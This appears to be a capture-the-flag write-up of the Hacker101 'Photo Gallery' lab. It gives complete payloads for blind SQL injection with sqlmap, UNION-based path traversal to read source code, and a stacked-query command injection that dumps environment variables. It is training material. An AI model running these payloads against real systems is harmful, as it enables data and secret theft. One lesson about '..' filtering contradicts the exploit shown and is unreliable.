# HackerOne Hacker101 CTF – Photo Gallery Write-up

**Challenge:** Photo Gallery  
**Difficulty:** Moderate  
**Category:** SQL Injection, Path Traversal, Command Injection  

| Flag | Status | Value |
|------|--------|-------|
| Flag0 | ✅ Found | `^FLAG^REDACTED$FLAG$` |
| Flag1 | ✅ Found | `^FLAG^REDACTED$FLAG$` |
| Flag2 | ✅ Found | `^FLAG^REDACTED$FLAG$` |

---

## Overview

A photo gallery application loads images via a `fetch?id=` endpoint. The server queries a filename from the database using the `id` parameter, then reads and returns the file. The `id` parameter is unsanitized, leading to SQL injection. Three separate vulnerabilities exist across the application.

---

## Reconnaissance

The application displays three photos:

```
fetch?id=1  →  "Utterly adorable"
fetch?id=2  →  "Purrfect"
fetch?id=3  →  "Invisible"  ← suspicious, image doesn't render
```

The underlying SQL query (later confirmed by reading source):

```sql
SELECT filename FROM photos WHERE id = [unsanitized input]
```

---

## SQL Injection Identification

### Basic tests

```
fetch?id=1'          → 500 Internal Server Error  (query broken)
fetch?id=1 ORDER BY 2--  → 500 Internal Server Error  (only 1 column)
```

### Boolean-based blind confirmation

```
fetch?id=1 AND 1=1  →  image returned   (TRUE)
fetch?id=1 AND 1=2  →  404 Not Found    (FALSE)
```

Boolean-based blind SQLi confirmed. The HTTP response code distinguishes true/false conditions.

### UNION attempts

```
fetch?id=-1 UNION SELECT null--
```
Initially failed — assumed SQLite, which was incorrect.

---

## Flag1 – Blind SQLi via sqlmap

### Initial sqlmap run (wrong DBMS assumption)

```bash
sqlmap -u "https://<target>/fetch?id=1" --dbms=sqlite --dump
```

Result: injection confirmed but DBMS fingerprint failed against SQLite.

### Correct run with `--code=200`

```bash
sqlmap -u "https://<target>/fetch?id=1" --dump --code=200 --level=3 --risk=2
```

The `--code=200` flag was critical: sqlmap uses HTTP 200 vs 404 to distinguish true/false. Without it, sqlmap could not reliably detect the injection.

**Back-end DBMS:** `MySQL >= 5.0.0 (MariaDB fork)`  
**Database:** `level5`  
**Tables:** `albums`, `photos`

### Database dump

| id | title | filename | parent |
|----|-------|----------|--------|
| 1 | Utterly adorable | files/adorable.jpg | 1 |
| 2 | Purrfect | files/purrfect.jpg | 1 |
| 3 | Invisible | `55bfd9d13c39cafe9102c8d225a6aa41746e75150e13db5495a444cfaf2f5081` | 1 |

Record 3 has no real filename — the `filename` field contains the flag itself. The "Invisible" image doesn't render because the server tries to open that hex string as a file and fails.

**Flag1:** `^FLAG^REDACTED$FLAG$`

---

## Flag0 – Source Code Read via Path Traversal

### Key insight

The server takes the SQL result (filename) and opens it directly:

```python
return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
```

The `..` filter only strips literal `..` — but a UNION SELECT can return any string as the filename. Since files are served from `files/`, going up one directory with `../` reaches the app root.

### Exploit

```bash
curl "https://<target>/fetch?id=-1+UNION+SELECT+'../main.py'--" -o main.py
```

This returned the full Flask application source code, which contained the flag in a comment:

```python
# It's dangerous to go alone, take this:
# ^FLAG^REDACTED$FLAG$
```

**Flag0:** `^FLAG^REDACTED$FLAG$`

---

## Flag2 – Command Injection via Stacked Queries

### Vulnerability

The main page builds a shell command using unsanitized filenames from the database:

```python
subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True
)
```

If a `filename` value contains shell metacharacters, arbitrary commands execute on the server. The output's **last line** appears in the `Space used:` section via `.strip().rsplit('\n', 1)[-1]`.

### Obstacles encountered

**Stacked queries seemingly blocked:** `MySQLdb` does not support stacked queries by default, so `; UPDATE ...` statements returned 500 errors. However — the UPDATE was actually executing despite the 500 response. The `id` parameter is string-interpolated (not parameterized), so the stacked query does run on the DB side even though the Python code crashes afterwards.

**Output truncation:** The `.rsplit('\n', 1)[-1]` call only shows the **last line** of command output. Commands like `env` or `printenv` produce multi-line output, so everything except the last line gets discarded. This is why early attempts showed nothing useful in `Space used:`.

**Wrong target:** Early attempts used `id=1` instead of `id=3`. The `id=3` record (Invisible) is the correct target since its filename is already broken (not a real file), and it feeds into the `du` command on the main page.

### What actually worked

Two key insights:

1. Use `echo $(printenv)` instead of `printenv` directly — `echo` wraps the entire output into a **single line**, bypassing the truncation issue.
2. The payload uses `"` to close the `du` filename argument, then injects the command after `;`.

### Exploit

```bash
# Step 1 - inject the payload (returns 500 but UPDATE executes)
curl "https://<target>/fetch?id=3;%20UPDATE%20photos%20SET%20filename%3D%22%3Becho%20%24(printenv)%22%20WHERE%20id%3D3%3B%20commit%3B--"

# Step 2 - load main page to trigger the du command with injected filename
curl "https://<target>/"
```

The `Space used:` section now contains the full environment on a single line:

```
PYTHONIOENCODING=UTF-8 ... FLAGS=["^FLAG^REDACTED$FLAG$","^FLAG^REDACTED$FLAG$","^FLAG^REDACTED$FLAG$"] ...
```

All three flags are stored in the `FLAGS` environment variable.

**Flag2:** `^FLAG^REDACTED$FLAG$`

### Why `echo $(printenv)` works

The `du` command becomes:
```bash
du -ch files/adorable.jpg files/purrfect.jpg files/;echo $(printenv) || exit 0
```

The `;` ends the `du` invocation, then `echo $(printenv)` runs and prints all environment variables on a **single line**. Since only the last line is shown in `Space used:`, and the entire printenv output is now collapsed into one line, it all appears in the response.

---

## Source Code Analysis

Key vulnerabilities in `main.py`:

```python
# VULN 1: Unsanitized SQL query → SQLi
cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id'])

# VULN 2: Unsanitized file path → Path traversal
return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()

# VULN 3: Unsanitized shell command → Command injection
subprocess.check_output('du -ch %s' % ' '.join('files/' + fn for fn in fns), shell=True)
```

---

## Tools Used

- **sqlmap 1.10.2** — automated SQL injection and DB enumeration
- **curl** — manual testing and file retrieval
- **exiftool** — image metadata analysis (no findings)
- **Browser source** — initial reconnaissance

---

## Key Lessons

- **Don't assume the DBMS** — SQLite was wrong; let sqlmap fingerprint without `--dbms` first, then confirm.
- **`--code=200` matters** — boolean blind SQLi requires correct true/false signal configuration in sqlmap.
- **UNION can return arbitrary filenames** — when a server reads a file based on a DB value, UNION injection becomes path traversal.
- **Read the source** — once source code is accessible, the remaining attack surface becomes obvious.
- **`..` stripping is not path traversal protection** — `replace('..', '')` only strips literal `..`; it doesn't prevent traversal if the path doesn't use `..`.
- **500 doesn't mean nothing happened** — the stacked query UPDATE returned 500 (Python crashed after the SQL ran) but the DB change persisted. Always check side effects even on error responses.
- **Output truncation is a real obstacle** — `rsplit('\n', 1)[-1]` discards everything but the last line. `echo $(command)` collapses multi-line output into one line, bypassing the filter.
- **Environment variables hold secrets** — in Docker/ECS deployments, flags and credentials are often passed as env vars. `printenv` is always worth trying when you have command injection.

---

*Write-up by d24yk4r4*
